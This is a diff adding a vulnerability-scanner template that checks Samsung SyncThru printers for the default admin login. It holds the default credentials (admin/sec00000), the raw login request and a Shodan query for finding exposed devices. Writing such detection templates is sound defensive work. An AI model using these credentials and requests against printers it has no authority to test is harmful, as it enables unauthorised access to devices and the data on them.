@@ -1,0 +1,52 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 'success: true'
+            - passwordExpiration
+        - part: header
+          type: word
+          words:
+            - text/html
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - sec00000
+        username:
+            - admin
+      raw:
+        - |
+          POST /sws/app/gnb/login/login.jsp HTTP/1.1
+          Host: {{Hostname}}
+
+          Authentication=Basic {{base64(username + ':' + password)}}
+id: samsung-printer-default-login
+info:
+    author: gy741
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: |
+        Samsung printers contain a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        max-request: 1
+        shodan-query: title:"SyncThru Web Service"
+        verified: true
+    name: Samsung Printer - Default Login
+    reference:
+        - https://support.hp.com/gb-en/document/c05591673
+    severity: high
+    tags:
+        - default-login
+        - iot
+        - samsung
+        - printer
+        - Samsung-Printer
+        - syncthru web service
